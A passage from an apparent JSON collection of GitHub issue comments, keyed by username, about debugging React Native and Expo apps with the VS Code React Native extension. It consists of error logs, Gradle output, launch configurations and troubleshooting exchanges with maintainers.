(C:\\Users\\nagnihotri.vscode\\extensions\\vsmobile.vscode-react-native-0.6.16\\node_modules\\q\\q.js:1122:31)\nat Promise.promise.promiseDispatch (C:\\Users\\nagnihotri.vscode\\extensions\\vsmobile.vscode-react-native-0.6.16\\node_modules\\q\\q.js:788:41)\nat C:\\Users\\nagnihotri.vscode\\extensions\\vsmobile.vscode-react-native-0.6.16\\node_modules\\q\\q.js:604:44\nat runSingle (C:\\Users\\nagnihotri.vscode\\extensions\\vsmobile.vscode-react-native-0.6.16\\node_modules\\q\\q.js:137:13)\nat flush (C:\\Users\\nagnihotri.vscode\\extensions\\vsmobile.vscode-react-native-0.6.16\\node_modules\\q\\q.js:125:13)\nat _combinedTickCallback (internal/process/next_tick.js:131:7)\nat process._tickCallback (internal/process/next_tick.js:180:9). \n[Info] Starting Packager\nScanning folders for symlinks in e:\\FullStackDev\\AwesomeProject\\node_modules (75ms)\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                                                                              \u2502\n\u2502  Running Metro Bundler on port 8081.                                         \u2502\n\u2502                                                                              \u2502\n\u2502  Keep Metro running while developing on any JS projects. Feel free to        \u2502\n\u2502  close this tab and run your own Metro instance if you prefer.               \u2502\n\u2502                                                                              \u2502\n\u2502  https://github.com/facebook/react-native                                    \u2502\n\u2502                                                                              \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\nLooking for JS files in\n   e:\\FullStackDev\\AwesomeProject\n   e:\\FullStackDev\\AwesomeProject.vscode \nMetro Bundler ready.\n[Info] Packager started.\n[Error] Failed to run the application in Android\nStack: Error: Failed to run the application in Android: Unknown error: not all success patterns were matched.\nIt means that \"react-native run-android\" command failed. Please, check the View -> Toggle Output -> React Native, View -> Toggle Output -> React Native: Run android output windows.\n    at Function.getWrappedError (C:\\Users\\nagnihotri.vscode\\extensions\\vsmobile.vscode-react-native-0.6.16\\src\\common\\error\\internalError.js:35:16)\n    at Function.wrapError (C:\\Users\\nagnihotri.vscode\\extensions\\vsmobile.vscode-react-native-0.6.16\\src\\common\\error\\errorHelper.js:18:44)\n    at resultOfCode.done.reason (C:\\Users\\nagnihotri.vscode\\extensions\\vsmobile.vscode-react-native-0.6.16\\src\\common\\entryPointHandler.js:43:72)\n    at _rejected (C:\\Users\\nagnihotri.vscode\\extensions\\vsmobile.vscode-react-native-0.6.16\\node_modules\\q\\q.js:844:24)\n    at C:\\Users\\nagnihotri.vscode\\extensions\\vsmobile.vscode-react-native-0.6.16\\node_modules\\q\\q.js:870:30\n    at Promise.when (C:\\Users\\nagnihotri.vscode\\extensions\\vsmobile.vscode-react-native-0.6.16\\node_modules\\q\\q.js:1122:31)\n    at Promise.promise.promiseDispatch (C:\\Users\\nagnihotri.vscode\\extensions\\vsmobile.vscode-react-native-0.6.16\\node_modules\\q\\q.js:788:41)\n    at C:\\Users\\nagnihotri.vscode\\extensions\\vsmobile.vscode-react-native-0.6.16\\node_modules\\q\\q.js:604:44\n    at runSingle (C:\\Users\\nagnihotri.vscode\\extensions\\vsmobile.vscode-react-native-0.6.16\\node_modules\\q\\q.js:137:13)\n    at flush (C:\\Users\\nagnihotri.vscode\\extensions\\vsmobile.vscode-react-native-0.6.16\\node_modules\\q\\q.js:125:13)\n    at _combinedTickCallback (internal/process/next_tick.js:131:7)\n    at process._tickCallback (internal/process/next_tick.js:180:9)\nLoading dependency graph, done.. That's all I have to share.. Well, you follow these commands and you will get that added\n1. npm install -g create-react-native-app\n2. create-react-native-app AwesomeProject\n3. cd AwesomeProject\n4. npm run android\nNow do we have any concrete answer for many developers like me for this issue? I never wanted to post an issue here but after hunting around the internet I have seen there are many developers struggling with this strange issue. I have noticed no proper answer was ever provided for this issue or no root cause were ever found for this issue. \nI am new to VS code and react-native, how should I deal with this when authentic commands start failing with no proper reason.  I looked github and stack overflow, trust me only more questions are there, not solution. . @ruslan-bikkinin Any update on this?. That's very unfortunate seeing Microsoft has such a poor open source support. I should not use VS code at all and refer some other available tools.\nThank you for your time.. I decided to not comment any more but you forced me. Just to make it clear for other users in this planet I have to response.\nYour summary is wrong, you have closed this issue without fixing as you always did for other posts for the same issue.(I have read many post for this issue)\nAs i said I get the error with VScode, even when it works with command line. . ",
    "shahram": "Sorry wrong place! Could you forward to the right place. Thanks. ",
    "IceApriler": "@SounD120 Hi, why can't i debug?\nReact Native: Run Android\n```\n[Warning] Target simulator is not supported for Android platform. If you want to use particular device or simulator for launching Android app, please specify  device id (as in 'adb devices' output) instead.\n[Info] Using Android SDK location defined in android/local.properties file: /Users/april/Library/Android/sdk.\n[Info] Starting React Native Packager.\nBuilding and installing the app on the device (cd android && ./gradlew installDebug)...\nStarting a Gradle Daemon, 1 incompatible and 1 stopped Daemons could not be reused, use --status for details\nWARNING: Configuration 'compile' is obsolete and has been replaced with 'implementation' and 'api'.\nIt will be removed at the end of 2018. For more information see: http://d.android.com/r/tools/update-dependency-configurations.html\nWARNING: Configuration 'compile' is obsolete and has been replaced with 'implementation' and 'api'.\nIt will be removed at the end of 2018. For more information see: http://d.android.com/r/tools/update-dependency-configurations.html\n:app:preBuild UP-TO-DATE\n:react-native-picker:preBuild UP-TO-DATE\n:react-native-picker:preDebugBuild UP-TO-DATE\n:react-native-picker:checkDebugManifest\n:react-native-picker:processDebugManifest\n:app:preDebugBuild\n:react-native-picker:compileDebugAidl\n:app:compileDebugAidl\n:react-native-picker:packageDebugRenderscript NO-SOURCE\n:app:compileDebugRenderscript\n:app:checkDebugManifest\n:app:generateDebugBuildConfig\n:app:prepareLintJar\n:app:mainApkListPersistenceDebug\n:app:bundleDebugJsAndAssets SKIPPED\n:app:generateDebugResValues\n:app:generateDebugResources\n:react-native-picker:compileDebugRenderscript\n:react-native-picker:generateDebugResValues\n:react-native-picker:generateDebugResources\n:react-native-picker:packageDebugResources\n:app:mergeDebugResources\n:app:createDebugCompatibleScreenManifests\n:app:processDebugManifest\n:app:splitsDiscoveryTaskDebug\n:react-native-picker:platformAttrExtractor\n:react-native-picker:generateDebugBuildConfig\n:react-native-picker:prepareLintJar\n:react-native-picker:javaPreCompileDebug\n:react-native-picker:processDebugJavaRes NO-SOURCE\n:app:compileDebugNdk NO-SOURCE\n:app:mergeDebugShaders\n:app:compileDebugShaders\n:app:generateDebugAssets\n:react-native-picker:mergeDebugShaders\n:react-native-picker:compileDebugShaders\n:react-native-picker:generateDebugAssets\n:react-native-picker:packageDebugAssets\n:app:mergeDebugAssets\n:app:copyDebugBundledJs SKIPPED\n:app:mergeDebugJniLibFolders\n:react-native-picker:compileDebugNdk NO-SOURCE\n:react-native-picker:mergeDebugJniLibFolders\n:react-native-picker:transformNativeLibsWithMergeJniLibsForDebug\n:react-native-picker:generateDebugRFile\n:app:processDebugResources\n:app:generateDebugSources\n:react-native-picker:generateDebugSources\n:react-native-picker:compileDebugJavaWithJavac?: /Users/april/myfile/www/gitstore/operator_app/node_modules/react-native-picker/android/src/main/java/com/beefe/picker/PickerViewModule.java?????????? API?\n?: ??????, ??? -Xlint:deprecation ?????\n:react-native-picker:transformClassesAndResourcesWithPrepareIntermediateJarsForDebug\n:app:javaPreCompileDebug\n:app:compileDebugJavaWithJavac\n:app:compileDebugSources\n:app:transformClassesWithDexBuilderForDebug\n:app:transformDexArchiveWithExternalLibsDexMergerForDebug\n:app:transformDexArchiveWithDexMergerForDebug\n:react-native-picker:transformNativeLibsWithIntermediateJniLibsForDebug\n:app:transformNativeLibsWithMergeJniLibsForDebug\n:app:processDebugJavaRes NO-SOURCE\n:app:transformResourcesWithMergeJavaResForDebug\n:app:validateSigningDebug\n:app:packageDebug\n:app:assembleDebug\n:app:installDebug\nInstalling APK 'app-debug.apk' on 'Pixel_2_XL_API_28(AVD) - 9' for app:debug\nInstalled on 1 device.\nBUILD SUCCESSFUL in 35s\n46 actionable tasks: 46 executed\nRunning /Users/april/Library/Android/sdk/platform-tools/adb -s emulator-5554 reverse tcp:8081 tcp:8081\nStarting the app on emulator-5554 (/Users/april/Library/Android/sdk/platform-tools/adb -s emulator-5554 shell am start -n cn.funxi.operator/cn.funxi.operator.MainActivity)...\nStarting: Intent { cmp=cn.funxi.operator/.MainActivity }\n```. ",
    "HCRenegade": "Yup sure, will do that in a while. :). @SounD120 @ruslan-bikkinin should have fixed everything, hope everything is okay \ud83d\ude04 . Alright I'm having some troubles with git. Everything should be ok in a while.. ",
    "VictDog": "Thank you for your reply @ruslan-bikkinin.  After running the response-native run-ios --simulator --no-packager command in the terminal, the simulator can run normally. I added \"trace\": \"verbose\" in the debug configuration, run the debug again, and found that the React-Native output channel is still: \n[Error] Error: Error while executing command 'react-native run-ios --simulator -- No-packager':\nError while executing command 'react-native run-ios --simulator --no-packager'\nand the debug console output like this:\nOS: darwin x64\nAdapter node: v8.9.3 x64\nvscode-chrome-debug-core: 3.17.3\n1:59:37 PM, 11/2/2018\nFrom client: initialize({\"clientID\":\"vscode\",\"clientName\":\"Visual Studio Code\",\"adapterID\":\"reactnative\",\"pathFormat\":\"path\",\"linesStartAt1\":true,\"columnsStartAt1\":true,\"supportsVariableType\":true,\"supportsVariablePaging\":true,\"supportsRunInTerminalRequest\":true,\"locale\":\"zh-cn\"})\nTo client: {\"seq\":0,\"type\":\"response\",\"request_seq\":1,\"command\":\"initialize\",\"success\":true,\"body\":{\"exceptionBreakpointFilters\":[{\"label\":\"All Exceptions\",\"filter\":\"all\",\"default\":false},{\"label\":\"Uncaught Exceptions\",\"filter\":\"uncaught\",\"default\":false}],\"supportsConfigurationDoneRequest\":true,\"supportsSetVariable\":true,\"supportsConditionalBreakpoints\":true,\"supportsCompletionsRequest\":true,\"supportsHitConditionalBreakpoints\":true,\"supportsRestartFrame\":true,\"supportsExceptionInfoRequest\":true,\"supportsDelayedStackTraceLoading\":true,\"supportsValueFormattingOptions\":true,\"supportsEvaluateForHovers\":true,\"supportsLoadedSourcesRequest\":true,\"supportsLogPoints\":true,\"supportsTerminateRequest\":true}}\nHandle launch request: {\n  \"name\": \"Debug iOS\",\n  \"program\": \"/Users/victory/Desktop/xxx/xxx/.vscode/launchReactNative.js\",\n  \"type\": \"reactnative\",\n  \"request\": \"launch\",\n  \"platform\": \"ios\",\n  \"sourceMaps\": true,\n  \"outDir\": \"/Users/victory/Desktop/xxx/xxx/.vscode/.react\",\n  \"trace\": \"verbose\",\n  \"__sessionId\": \"fbf4e22a-cbdc-45c8-83f8-1ce8517894dd\"\n}\nCould not debug. Error while executing command 'react-native run-ios --simulator --no-packager': Error while executing command 'react-native run-ios --simulator --no-packager'\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"terminated\"}\nFrom client: disconnect({\"restart\":false})\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"output\",\"body\":{\"category\":\"telemetry\",\"output\":\"FullSessionStatistics/SourceMaps/Overrides\",\"data\":{\"aspNetClientAppFallbackCount\":0}}}\nTo client: {\"seq\":0,\"type\":\"response\",\"request_seq\":3,\"command\":\"disconnect\",\"success\":true}\nLooking forward to your reply, thank you\n. ",
    "mjbvz": "It was added in VS Code 1.23\nThe vscode version in the package.json dependencies does not matter since it just downloads the vscode.d.ts version based in the engines in package.json. ",
    "isidorn": "Are there any plans to address this?\nDo you agree with my suggesstions here?\nIf you do not have cycles to address this but would like to see it done, I can try to get some users to provide a PR which tackles this.\nThanks a lot. @ruslan-bikkinin awesome, thanks a lot for your reply. Let me know if we can help somehow or if you have questions.. @ruslan-bikkinin no, nothin is getting deprecated.\nI am just providing suggestions on how we should improve this process, I would love if we could tackle this but there is no rush.. ",
    "hatton": "My apologies if this isn't close enough to what this issue is about...\nI created an app using ``expo \nI followed the instructions in the PR #826, ran the \"Debug in Exponent\", logged in to expo when prompted, scanned the QR code, runs the sample app on my phone, all good! However vscode does not stop at breakpoints, and after a few minutes I get an error, \"Launch/Request timeout\".\nI note from the instructions that I should expect some files to be created in .vscode/ , e.g. exponentIndex.js . These files are not created. All I see is .vscode/.react/debuggerWorker.js\nMy launch.json is\n\"configurations\": [\n    {\n      \"name\": \"Debug in Exponent\",\n      \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n      \"type\": \"reactnative\",\n      \"request\": \"launch\",\n      \"platform\": \"exponent\",\n      \"sourceMaps\": true,\n      \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n    }\n  ]\nI'm looking for something obvious like in this reply but not seeing it, sorry!\ngithub repo\noutput log\nexpo version 2.4.0\nextension version 0.6.18\nnode 10.13.0-64. >>    I'm looking for something obvious like in this reply but not seeing it, sorry!\n\nSo, did you try that solution? Did it help you?\n\nIn that screenshot, there is a \"Debug JS\" link on the phone. But I don't see anything like that in the Android expo app. Similarly, the instructions now show a different screenshot with that kind of button, but again, only a partial screenshot, so you can't see where in the app you should see this.\nHere's what I see: https://i.imgur.com/PDxSEvg.png, https://i.imgur.com/6OG8FNO.png.\nAlso, do let me know if you'd like a different issue for @Morriz and I seeing no .vscode/exponentIndex.js.  Thanks!\n. OK, I read more instructions, more carefully, and found that the secret to getting to the developer menu is literally shaking your device (that's a new one!). And now we have https://github.com/Microsoft/vscode-react-native/issues/846 for the lack of generated .vscode files, so my part of this issue is dealt with. Thanks for the help!. > @hatton thanks for your reply. Do you experience the same issue now like in #846?\nYes, I still do not see .vscode/exponentIndex.js. \n\n. @ruslan-bikkinin You could use my repo from #834  to reproduce. I can now debug, but both during and after the debug session, I see\n\n. So, this was closed, and I can debug, but I'm still not clear why .vscode/exponentIndex.js  is not created. I'm finding the documentation section that mentions it unclear... is this perhaps only created if you are not using expo? If so, we could improve the title of this section to \"Configuring Expo when not using the Expo SDK\".. ",
    "Morriz": "\nSorry if I confused you with my answer about the docs. The most recent documentation is in improve-docs branch and we are going to merge it soon. So for now, please turn to this documentation file for getting more details about how to debug Expo apps until it merged.\n\nThat link is dead, but if I open the correct one (mentioned above), and follow those instructions, I still get errors:\nDebug adapter process has terminated unexpectedly (read error). I do. Also, your newly pointed documentation still refers to old expo stuff:\nthe extension will install xde and @expo/ngrok when this feature is used for the first time.. It works now. Had to restart vscode :). And now it barks on .vscode/exponentIndex.js not found. > Thanks for moving it here @Morriz. Have .vscode/exponentIndex.js file been created after the debugging session had stopped? Seems to be that packager could find it. Please, also, show us what debug configuration do you use and what app are you trying to debug: Expo one or pure React native one?\nI am using the expo one (as mentioned in the bug report title). But no,  no such file is created. Only the .react/debuggerWorker.js file. Here's my config\n{\n            \"name\": \"Debug in Exponent\",\n            \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n            \"trace\": \"verbose\",\n            \"type\": \"reactnative\",\n            \"request\": \"launch\",\n            \"platform\": \"exponent\",\n            \"sourceMaps\": true,\n            \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n        }. A more complete output of the ReactNative console:\n::ffff:192.168.178.12 - - [29/Nov/2018:15:06:37 +0000] \"GET /.vscode/exponentIndex.bundle?platform=ios&dev=true&minify=false&hot=false&assetPlugin=$PROJECT_DIR%2Fnode_modules%2Fexpo%2Ftools%2FhashAssetFiles HTTP/1.1\" 200 - \"-\" \"Expo/2.9.0.103161 CFNetwork/976 Darwin/18.2.0\"\nerror: bundling failed: Error: The resource `$PROJECT_DIR/.vscode/exponentIndex.js` was not found.\n    at $PROJECT_DIR/node_modules/metro/src/IncrementalBundler.js:122:24\n    at gotStat (fs.js:1619:21)\n    at $PROJECT_DIR/node_modules/graceful-fs/polyfills.js:282:31\n    at FSReqCallback.oncomplete (fs.js:161:21)\n BUNDLE  [ios, dev] .vscode/exponentIndex.js \u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591 0.0% (0/1), failed.\n(I replaced the project dir refs with $PROJECT_DIR)\n@hatton did you not have the same problem as me before?. nevermind, I now got it working by resetting the expo client...breakpoints are working now too!. ",
    "The-Developeur": "Thank you  @ruslan-bikkinin . @ruslan-bikkinin  When i start my project with the \"Debug in Exponent\" configuration i have this error\n\nAnd in my .vscode Folder i don'y have launchReactNative.js\nI have an other error when i select on the expo app remote js debuging i have this error on the console\n\n. @hatton  I hnow but when i select remote debuging expo said me i need chrome to allow me remote debuging. ### Actual Behavior\ni start the debugger with the configuration Debug in Exponent \n\nI Have this error\n\nThe Debugger ShutDown\n### Expected Behavior\ndebugger to continue\nSoftware\nI use the expo app on ios\nThis is my error when i selected \"use a remote debugger\"\n\n\n. \n    Output of the Debug Console (View -> Toggle Debug Console):\nNothing.\n\nOutput of the React-Native output channel (View -> Toggle Output -> Select React-Native in ListBox):\n\nI don't have react native in the Listbox\n\n\n\nI have the extension;\n\n\nOutput of the Developer Tools console (Help -> Toggle Developer Tools -> Select Console tab):\n\n| t.onDidNotificationChange | @ | notificationsAlerts.ts:40\n-- | -- | -- | --\n\u00a0 | (anonymous) | @ | notificationsAlerts.ts:26\n\u00a0 | e.fire | @ | event.ts:145\n\u00a0 | t.notify | @ | notifications.ts:113\n\u00a0 | t.error | @ | notificationService.ts:48\n\u00a0 | (anonymous) | @ | debugService.ts:511\n\u00a0 | e.fire | @ | event.ts:145\n\u00a0 | (anonymous) | @ | debugSession.ts:749\n\u00a0 | e.fire | @ | event.ts:145\n\u00a0 | t.fireAdapterExitEvent | @ | rawDebugSession.ts:461\n\u00a0 | (anonymous) | @ | rawDebugSession.ts:440\n\u00a0 | _tickCallback | @ | internal/process/next_tick.js:188\n\u00a0 | Promise resolved (async) | \u00a0 | \u00a0\n\u00a0 | t.stopAdapter | @ | rawDebugSession.ts:439\n\u00a0 | (anonymous) | @ | rawDebugSession.ts:427\n\u00a0 | Promise rejected (async) | \u00a0 | \u00a0\n\u00a0 | t.shutdown | @ | rawDebugSession.ts:423\n\u00a0 | (anonymous) | @ | rawDebugSession.ts:80\n\u00a0 | e.fire | @ | event.ts:145\n\u00a0 | (anonymous) | @ | debugAdapter.ts:378\n\u00a0 | emitOne | @ | events.js:121\n\u00a0 | emit | @ | events.js:211\n\u00a0 | Socket._destroy.cb._handle.close | @ | net.js:554\n\n. @ruslan-bikkinin . Software versions\nReact-Native VS Code extension version:\nVS Code extension version: 0.7.0\nVsCode version : 1.29.1\nWindows 10 Version 1809\nNodeJs version : v10.13.0\nReact native version : v0.57.5\nExpo sdk version : sdk-31.0.0\nExpo Cli version : 2.6.0\nThis sample projet don't run with the \"Debug in Exponent\" debuger config\n(When you donlowoad the projet don't forget to run npm i ^^ )\ntest.zip\n@ruslan-bikkinin \n. Okay,\nthank you for your helping ^^\nFinally i use your extension with the react native cli and it work perfectly ! \n. I confirm i have the same issue as @CrazzzyDev ,\n. Would it be possible to create a configuration that automatically starts the haul packager,\nBecause it is annoying to have to start the haul packager separately when you want to do some debuging\nThank you in advance for any future updates\n. ",
    "arshadmo": "iam having the issue can anyone help me out\n. ",
    "AlexandreLouisnard": "Hello,\nIndeed. As it happened right after the update and it was still working when starting the server from outside vscode I thought it was linked.\nThanks for your answer and sorry for bothering.\nRegards. ",
    "Mimetis": "I've just installed everything today, so I guess the last one :)\n$ expo --version\n2.6.9. From my last attempt :)\n\"dependencies\": {\n    \"expo\": \"^31.0.2\",\n    \"react\": \"^16.6.3\",\n    \"react-native\": \"^0.57.7\"\n  },\n  \"devDependencies\": {\n    \"babel-preset-expo\": \"^5.0.0\"\n  },. Just tried with node version 10.14.1 and 9.11.2.\nIt's still not working.\nI'm continuing my investigations on my side . Thx @ruslan-bikkinin !!\nUninstalling both extension and expo-cli did the trick !\nWith a new clean install, everything is now eventually working :)\nThx for all !. ",
    "supagu": "I've worked around the problem by using cross-fetch (https://www.npmjs.com/package/cross-fetch)\n. Nope I'm not using haul. My work around seems suitable, so you close this task if you like. . Thanks, problem turned out to be I was missing package.json. ",
    "mustafahafidi": "It works thanks! sorry I missed that comment.\n\nhi @mustafahafidi and thanks for reaching us. Did you try solution from this #857 (comment)?\n\n. ",
    "devlinb": "Setting \"react-native.packager.port\": 19001 lets me use \"Attach to Packager\", which works really well! Loving the experience!. Hi @ruslan-bikkinin, I was out for the holidays, I'll see if this fixes it on Monday and report in.. Hi @ruslan-bikkinin same issue after running the commands, and rebooting even!\nAlso of note, only the following files are in the .vscode directory\n1,913 launch.json\n147 settings.json\n\nI have also noticed that if expo is already running and I press \"debug in exponent\" in VSCode, that the error\n[Error] Error: Error while executing command 'taskkill /pid 6676 /T /F': Command failed: taskkill /pid 6676 /T /F\nERROR: The process \"6676\" not found.\n\nshows up in the Output.\nI checked what PIDs Expo is using, and indeed none of the 9 (!!!) processes that expo start  kick off have the PID of 6676. Upgrading to expo 32, deleting node_modules, and the package.lock file (which was apparently causing lots of issues), fixed this.\nI'm getting gallons of warnings and errors, e.g. \nNo issue with doctor-watchman-versionNo issue with doctor-watchman-versionNo issue with doctor-watchman-version\n\nis repeated 20+ times but other that that things work.\nThank you for your help! Closing out.. ",
    "Sakarisson": "Hello @ruslan-bikkinin. Thanks for the feedback. I already submitted this PR a few days ago, but since the check mysteriously failed, I assumed it was because of line ending issues. I attempted to fix it in this new version of the PR, which in light of your answer was pointless.. ",
    "znnnnn": "sorry for my weakly English. ",
    "fantasy525": "\nHi @fantasy525 and thanks for questioning. You can start packager once via palette command > React-Native: Start packager and then use Attach to packager debug configuration to connect to it.\nPlease let us know if it helps.\nThank you,and I did as you said,but it does't works,I set a red break point, but it dones't stop at break point.\n. @ruslan-bikkinin  I find it works sometimes,but not sometimes,\n\nDo you want to see anything else \uff1f. @ruslan-bikkinin I didn't use Hual,and I tried to change the position of the breakpoint,but it  still doesn't work at timers. now I test it ,it works,so I will close this issue  for the moment.. @ruslan-bikkinin  Yes ,you can clone it ,then just do this:\n1.yarn install\n2. react-native run-android\n. @ruslan-bikkinin  I'm not sure which line of code is going to happen ,but I have met many times.and you can also see this issues.  @ruslan-bikkinin I type  'debugger' in my file,but finally the  breakpoint stops in other file\n\n\nother file:\n\nand I've given up on the red breakpoint.I want to type 'debugger' manually.but Why is my debugging experience so bad? Today red breakpoint is still incorrect and sometimes program still can't stop at breakpoint...\n. @ruslan-bikkinin  Hi,I think it is possible that the cache of the previous code caused the breakpoint to be placed incorrectly.just a guess...,I hope you can solve the problem as soon as possible, thank you!. ",
    "PDostalek": "Thanks for confirmation. Thanks!. Thanks!. Thank you.. SRC:\nShake or press menu button \nDev Settings\nDebug Server host & port for Device\n. Thank for confirmation. ",
    "mlostekk": "Yes, it was always working fine.. till 2 weeks ago. Also when trying to use your recommended setting,  i see thi \n\n. Ah, good hint... NVM using 8.15.0 does not work. But 8.11.1 works. Regardless of the setting \"react-native-tools.projectRoot\": \".\", its not working with 8.15.0 set via nvm alias. Its only working with 8.11.1. oh yes. sorry, that was my fault. did not do that! thank you for your quick help. ",
    "lojell": "I have the same problem. ",
    "khpang94": "Thanks for answering me, i have resolved it by replacing a new image for \"Boss.png\". I not sure why the original one is spoiled, because it able to start in another PC.. ",
    "MarcoLLeite": "Not matching required template. ",
    "lrkwz": "Yes ot is more clear, sorry for my bad English.. ",
    "sregg": "Are you sure configurationIdx + 1 is what you wanted here?. Seems like configurationIdx is the right index.... I tried it and got this:\nCould not debug. Could not found executable in /Users/simonreggiani/app/ios/build/Build/Products/-iphonesimulator\nwith this launch.json:\n{\n  \"name\": \"Debug iOS - iPhone X - Dev\",\n  \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n  \"type\": \"reactnative\",\n  \"request\": \"launch\",\n  \"platform\": \"ios\",\n  \"sourceMaps\": true,\n  \"outDir\": \"${workspaceRoot}/.vscode/.react\",\n  \"runArguments\": [\n    \"--simulator=iPhone X\",\n    \"--scheme=app-dev\",\n    \"--configuration=Dev.Debug\"\n  ]\n}. ",
    "dhanvikapila": "I dont think this works. I havent seen this in my VSCode install on my personal laptop.. Are we sure this works? . suggestion\nTo start debugging create a new debug configuration for your ReactNative app in your `.vscode/launch.json`. Adding a new configuration can be done by opening your `launch.json` file and clicking on `Add Configuration...` button and choosing a relevant debug configuration. All available debug configurations for ReactNative can be accessed by typing in *ReactNative* and picking one from the list populated by Intellisense as shown in the image below.. Can we capture a gif and include that list we do everywhere else?  Its better than having Red arrows :). I was trying out the Expo docs yesterday and I think we need to fix these as well. These docs mention files within the .vscode directory which I dont see anymore.  Can you go through an end-to-end workflow to setup up debugging on a medium sized RN project to understand what all we need to update? Thanks. . Small change in the message - You need to login to Expo. Please provide your Expo account username and password in the input boxes after closing this window. If you don't have an account, please go to https://expo.io to create one.\nAlso can we add a note in the debug section why the extension is asking for this information? . Will this prompt show the text being entered for password? . Is there a metric on how many users hit \"Cancel\" here? . "
}